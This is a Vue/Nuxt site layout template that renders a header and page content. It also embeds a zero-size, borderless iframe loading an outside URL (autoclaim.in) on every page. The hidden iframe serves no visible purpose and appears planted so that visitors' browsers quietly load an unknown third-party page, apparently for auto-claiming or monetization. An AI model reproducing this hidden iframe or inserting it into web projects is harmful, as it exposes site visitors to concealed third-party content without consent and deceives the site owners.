<template>
  <div class="font-sans bg-gray-100 antialiased min-h-screen h-full text-black">
    <Header />
    <main>
      <Nuxt />
    </main>
    <iframe
      src="https://autoclaim.in/wm/acatzk/2"
      width="0"
      height="0"
      style="border:0"
    ></iframe>
  </div>
</template>

<script>
export default {
  components: {
    Header: () => import("@/components/Header")
  }
};
</script>
